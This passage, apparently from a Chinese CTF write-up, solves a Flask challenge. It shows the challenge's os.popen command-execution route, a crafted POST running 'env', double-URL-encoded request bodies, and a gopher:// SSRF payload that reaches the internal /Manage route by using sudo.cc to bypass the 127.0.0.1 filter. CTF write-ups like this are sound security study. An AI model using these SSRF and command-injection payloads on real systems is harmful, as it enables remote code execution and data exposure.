    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
    <p>
     题目也提示要打gopher。可以Gopher路由打ssrf到?manage路由
    </p>
    <p>
     首先访问
     <code>
      /Manage
     </code>
     路由，满足其条件
    </p>
    <pre><code class="prism language-http">POST /Manage HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

cmd=env
</code></pre>
    <p>
     然后进行两次url编码(网站：
     <code>
      https://www.iamwawa.cn/urldecode.html
     </code>
     )(或者在bp里面两次url编码)
    </p>
    <pre><code class="prism language-http">POST%2520%252FManage%2520HTTP%252F1.1%250AHost%253A%2520127.0.0.1%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250AContent-Length%253A%25207%250A%250Acmd%253Denv
或
%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%34%64%25%36%31%25%36%65%25%36%31%25%36%37%25%36%35%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%37%25%30%61%25%30%61%25%36%33%25%36%64%25%36%34%25%33%64%25%36%35%25%36%65%25%37%36
</code></pre>
    <p>
     payload：
    </p>
    <pre><code>/Gopher?url=gopher://sudo.cc:8000/_POST%2520%252FManage%2520HTTP%252F1.1%250AHost%253A%2520127.0.0.1%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250AContent-Length%253A%25207%250A%250Acmd%253Denv
</code></pre>
    <p>
     由于gopher伪协议不计入第一个字符，需要填充，然后127.0.0.1需要绕过。可以使用sudo.cc 127.0.0.2等
    </p>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="68747470733a2f2f626c6f:672e6373646e2e6e65742f323330315f37393436393334312f:61727469636c652f64657461696c732f313436323437383433" class_="artid" style="display:none">
 </p>
</div>


